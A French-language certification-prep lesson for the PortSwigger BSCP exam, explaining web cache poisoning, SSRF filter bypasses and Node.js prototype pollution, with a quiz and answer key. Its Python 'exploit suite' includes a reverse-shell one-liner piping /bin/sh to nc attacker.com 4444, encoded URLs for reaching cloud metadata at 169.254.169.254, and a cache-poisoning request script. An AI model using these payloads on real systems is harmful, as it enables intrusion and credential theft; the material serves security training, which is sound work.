# TOME P7 — Certifications d'Élite & Spécialisations — Jour 329 (6h) : BSCP Prep — Web Cache Poisoning, SSRF Avancé & Prototype Pollution (PortSwigger Certified Web Security Practitioner)

> [!NOTE]
> **Objectif du jour :** Maîtriser les vulnérabilités web complexes ciblées par la certification **BSCP (PortSwigger Certified Web Security Practitioner)** : exploiter le **Web Cache Poisoning** via des en-têtes non enregistrés (Unkeyed Headers), réaliser des attaques **SSRF (Server-Side Request Forgery)** avancées avec contournement de filtres (IPv6, Octal, DNS Rebinding, Cloud Metadata IMDSv2), et exploiter la **Prototype Pollution** (Client-side & Server-side Node.js) pour conduire à un RCE ou un XSS.
>
> **Compétences visées :** `BSCP-01` (A) — Web Cache Poisoning & Unkeyed Inputs | `BSCP-02` (A) — Advanced SSRF (Cloud Metadata Bypass) & Client/Server Prototype Pollution

---

## 1) Module — Web Cache Poisoning & Unkeyed Headers (2h)

### 📖 Narration/Intuition

Le **Web Cache Poisoning** consiste à exploiter la différence entre les clés de cache (**Cache Keys**) et le traitement réel de la requête par le serveur d'origine. Si une entrée utilisateur (ex. en-tête `X-Forwarded-Host`) affecte la réponse mais n'est **PAS incluse dans la Cache Key** (Unkeyed Header), l'attaquant peut empoisonner le cache du CDN/Serveur HTTP avec un payload malveillant (ex. XSS), qui sera ensuite servi à TOUS les utilisateurs légitimes.

```
Attaquant (Requête malveillante avec Unkeyed Header)
 GET /main.js HTTP/1.1
 Host: target.com
 X-Forwarded-Host: attacker.com   <--- UNKEYED INPUT !
         │
         ▼
 Serveur HTTP Origine (Génère une réponse pointant vers attacker.com/evil.js)
         │
         ▼
 Web Cache / CDN (Stocke la réponse malveillante sous la Cache Key "GET /main.js")
         │
         ▼
 Victime légitime (Demande GET /main.js) ──► Reçoit la réponse empoisonnée depuis le Cache (XSS exécuté !)
```

---

## 2) Module — Exploitation & Scripts BSCP (`bscp_web_exploits.py`) (2h)

### 🛠️ Atelier Pratique

```python
import requests
import urllib.parse

class BSCPExploitSuite:
    """
    Démonstration des vecteurs d'attaque avancés BSCP :
    1. Web Cache Poisoning via X-Forwarded-Host
    2. Contournement SSRF via Encodage Octal / IP Obfuscation
    3. Client-Side Prototype Pollution Payload Generator
    """

    @staticmethod
    def test_cache_poisoning(target_url: str, exploit_domain: str):
        """Teste l'empoisonnement de cache via un-keyed header X-Forwarded-Host."""
        headers = {
            "User-Agent": "BSCP-Scanner/1.0",
            "X-Forwarded-Host": exploit_domain  # Header non inclus dans la cache key
        }
        print(f"[*] Envoi de la requête d'empoisonnement vers : {target_url}")
        res = requests.get(target_url, headers=headers)
        
        # Vérification si le domaine malveillant est réinjecté dans le body
        if exploit_domain in res.text:
            print(f"[!] VULNÉRABLE : Le domaine d'attaque '{exploit_domain}' a été mis en cache !")
            print(f"    Cache Header: {res.headers.get('X-Cache', 'N/A')}")
        else:
            print("[-] Non vulnérable ou header sécurisé.")

    @staticmethod
    def generate_ssrf_bypass_urls(target_internal_ip: str = "169.254.169.254") -> list:
        """Génère des formats d'URL d'évasion pour contourner les filtres SSRF (Cloud Metadata / Loopback)."""
        bypasses = []
        # Encodage Octal (169.254.169.254 -> 0251.0376.0251.0376)
        bypasses.append("http://0251.0376.0251.0376/latest/meta-data/")
        # Dotted Hex (0xa9.0xfe.0xa9.0xfe)
        bypasses.append("http://0xa9.0xfe.0xa9.0xfe/latest/meta-data/")
        # Integer Encodé (2852039166)
        bypasses.append("http://2852039166/latest/meta-data/")
        # Short local (127.0.0.1 -> 127.1 / 0 / ::1)
        bypasses.append("http://127.1/")
        bypasses.append("http://[::]/")
        # Bypass via DNS Rebinding / Services de redirection (nip.io / spoof)
        bypasses.append("http://169.254.169.254.nip.io/latest/meta-data/")
        return bypasses

    @staticmethod
    def generate_prototype_pollution_payloads() -> dict:
        """Payloads de Prototype Pollution Client-Side & Server-Side (Node.js RCE)."""
        return {
            "client_side_query_string": "?__proto__[transport_url]=data:,alert(1)//",
            "json_payload_gadget": {
                "__proto__": {
                    "execArgv": ["--eval=require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f')"]
                }
            }
        }

# Exécution des tests
print("=== BSCP WEBPACK — EXPLOIT GENERATOR ===")
ssrf_urls = BSCPExploitSuite.generate_ssrf_bypass_urls()
print("\n[+] URLs de Contournement SSRF (Cloud Metadata IMDS) :")
for url in ssrf_urls:
    print(f"  -> {url}")

pp_payloads = BSCPExploitSuite.generate_prototype_pollution_payloads()
print("\n[+] Payload Prototype Pollution Node.js (RCE Gadget) :")
print(pp_payloads["json_payload_gadget"])
```

---

## 3) Module — Deep-Dive Prototype Pollution (Node.js Server-Side RCE) (2h)

```javascript
// Démonstration Server-Side Prototype Pollution dans une application Express.js
const express = require('express');
const lodash = require('lodash'); // Version vulnérable < 4.17.12
const app = express();

app.use(express.json());

// Endpoint vulnérable fusionnant de manière insécurisée un objet JSON utilisateur
app.post('/api/user/profile', (req, res) => {
    let userProfile = {};
    // La fonction merge modifie Object.prototype si __proto__ est injecté
    lodash.merge(userProfile, req.body);
    
    res.json({ status: "success", profile: userProfile });
});

// Gadget RCE : Si child_process.fork() ou spawn() est appelé plus tard dans l'application,
// les propriétés polluées sur Object.prototype (ex: env, execArgv) sont héritées !

/* 
Payload d'attaque (HTTP POST /api/user/profile):
{
  "__proto__": {
    "shell": "/bin/bash",
    "NODE_OPTIONS": "--require /tmp/evil.js"
  }
}
*/
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **BSCP** | PortSwigger Certified Web Security Practitioner — Certification pratique d'élite sur la sécurité web (Burp Suite) |
| **SSRF** | Server-Side Request Forgery — Faille forçant le serveur web à effectuer des requêtes internes non autorisées |
| **IMDS** | Instance Metadata Service — Service Cloud (AWS 169.254.169.254) fournissant des identifiants IAM temporaires |
| **RCE** | Remote Code Execution — Exécution d'instructions arbitraires sur le système distant |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Dans une attaque de **Web Cache Poisoning**, qu'est-ce qu'un **Unkeyed Header** ?
- A) Un en-tête HTTP pris en compte par le serveur d'origine pour générer le contenu de la réponse, mais ignoré par le serveur de Cache/CDN lors du calcul de la Cache Key
- B) Un en-tête chiffré sans clé RSA
- C) Un cookie expiré
- D) Une clé API publique

**Réponse : A**

**Q2 :** Comment contourner un filtre SSRF naïf qui bloque l'adresse IP littérale `169.254.169.254` pour accéder aux métadonnées Cloud AWS ?
- A) En utilisant des encodages alternatifs d'IP (ex. octal `0251.0376.0251.0376`, hexadécimal `0xa9.0xfe.0xa9.0xfe`, ou un service de résolution DNS comme `nip.io`)
- B) En changeant de navigateur web
- C) En utilisant du HTTPS
- D) En envoyant un ping avant la requête

**Réponse : A**

**Q3 :** Quelle est la cause racine de la vulnérabilité **Prototype Pollution** en JavaScript ?
- A) Une fusion (merge/clone) récursive non sécurisée d'objets JSON permettant d'écrire des propriétés arbitraires sur `Object.prototype`, modifiant le comportement de tous les objets de l'application
- B) Un buffer overflow en mémoire C++
- C) Une erreur de syntaxe SQL
- D) L'absence de certificat SSL

**Réponse : A**

**Q4 :** Dans AWS, quelle version de l'Instance Metadata Service (**IMDSv2**) protège contre les vulnérabilités SSRF classiques en exigeant un jeton de session obtenu via une requête `PUT` avec un header spécifique ?
- A) IMDSv2 (exige un header `X-aws-ec2-metadata-token-ttl-seconds` avec une méthode `PUT` préalable)
- B) IMDSv1
- C) IMDS-legacy
- D) AWS S3 Access Control

**Réponse : A**

**Q5 :** Dans Server-Side Prototype Pollution avec Node.js, quel module natif est couramment exploité comme "gadget" pour transformer la pollution d'objet en **RCE** ?
- A) `child_process` (via l'injection de `execArgv`, `NODE_OPTIONS` ou `shell`)
- B) `fs` (File System) uniquement
- C) `http`
- D) `crypto`

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
